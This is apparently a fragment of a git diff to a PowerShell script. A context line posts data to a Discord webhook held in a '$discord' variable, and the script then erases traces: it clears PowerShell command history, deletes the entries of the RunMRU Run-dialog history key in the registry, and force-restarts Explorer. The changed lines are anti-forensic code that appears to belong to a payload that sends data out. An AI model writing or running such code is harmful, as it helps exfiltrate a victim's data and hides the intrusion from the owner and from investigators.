@@ -32,8 +32,11 @@ Invoke-RestMethod -Uri $discord -Method Post -ContentType "application/json" -Bo
 # Clear the PowerShell command history
 Clear-History
 
-# Clear Run command history by deleting the registry key
-Remove-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Recurse -Force
+# Delete all entries in the RunMRU key except for the default value
+Get-ChildItem 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' | 
+    Where-Object { $_.Name -ne "(default)" } | 
+    Remove-Item -Force
 
-# Recreate the RunMRU registry key to ensure it exists after deletion
-New-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
+# Optionally, refresh the registry view in Explorer to ensure the changes take effect immediately
+Stop-Process -Name explorer -Force
+Start-Process explorer
